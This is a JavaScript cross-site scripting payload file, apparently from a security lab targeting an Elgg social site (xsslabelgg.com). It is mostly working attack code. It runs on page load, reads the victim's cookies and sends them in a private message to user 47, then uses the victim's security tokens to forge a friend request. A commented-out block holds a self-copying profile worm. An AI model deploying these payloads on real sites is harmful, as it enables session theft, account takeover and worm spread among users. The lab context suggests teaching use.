// alert(`xss`);
function addFriend(){
var Ajax=null;
var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
var token="&__elgg_token="+elgg.security.token.__elgg_token;
var sendurl="http://www.xsslabelgg.com/action/friends/add?friend=47"+token+ts;
//Create and send Ajax request to add friend
Ajax=new XMLHttpRequest();
Ajax.open("GET",sendurl,true);
Ajax.setRequestHeader("Host","www.xsslabelgg.com");
Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
Ajax.send();
// alert(`friend added`);
}


function sendMessage2() {
    var url = "http://www.xsslabelgg.com/action/messages/send";
    var method = "POST";
    var body = "<p>"+document.cookie+"</p>";
    var recipient = 47;
    var subject = "herecookie";
    var elggToken = elgg.security.token.__elgg_token;
    var elggTs = elgg.security.token.__elgg_ts;
    var data = new URLSearchParams();
    data.append("__elgg_token",elggToken);
    data.append("__elgg_ts",elggTs)
    data.append("recipients","");
    data.append("recipients[]", recipient);
    data.append("subject", subject);
    data.append("body", body);
    // alert(data)
    fetch(url, {
      method: method,
      headers: {
        "Content-Type": "application/x-www-form-urlencoded",
        "Access-Control-Allow-Origin": "1b15-197-232-61-227.ngrok-free.app", // Replace with your domain
      },
      body: data,
      mode: "cors",
    })
      .then(function (response) {
        if (response.ok) {
          return response.text();
        }
        throw new Error("Network response was not ok.");
      })
      .then(function (responseData) {
        console.log(responseData);
        // alert("Message sent!");
        addFriend();
      })
      .catch(function (error) {
        console.log("Error:", error);
      });
  }


window.onload = function(){
    sendMessage2();

}


// function worm(){}

// //JavaScript code to access user name, user guid, Time Stamp __elgg_ts
// //and Security Token _elgg_token
// var userName=elgg.session.user.name;
// var guid="&guid=".concat(elgg.session.user.guid);
// var ts="&__elgg_ts=".concat(elgg.security.token.__elgg_ts);
// var token="&__elgg_token=".concat(elgg.security.token.__elgg_token);
// var
// briefdesc="&briefdescription=Samy+is+MY+HERO".concat("&accesslevel%5Bbriefdescription%5D=2");
// var name="&name=".concat(userName);
// var jsCode="<script type='text/javascript'
// id=worm>".concat(document.getElementById("worm").innerHTML).concat("</").concat("script>");
// var wormCode=encodeURIComponent(jsCode);
// var desc="&description=".concat(wormCode).concat(+"&accesslevel%5Bdescription%5D=2");
//Construct the content of your url.
// var sendurl="http://www.xsslabelgg.com/action/profile/edit";
// var content=token+ts+name+desc+guid; //FILL-IN
// var samyGuid=47;
// if(elgg.session.user.guid!=samyGuid) {
// //Create and send Ajax request to modify profile
// var Ajax=null;
// Ajax=new XMLHttpRequest();
// Ajax.open("POST",sendurl,true)
// Ajax.setRequestHeader("Host","www.xsslabelgg.com");
// Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
// Ajax.send(content);
// }

// __elgg_token=H4bhnCn94py3VntRp8rcIg&__elgg_ts=1683355104&recipients=&recipients[]=47&subject=test12&body= 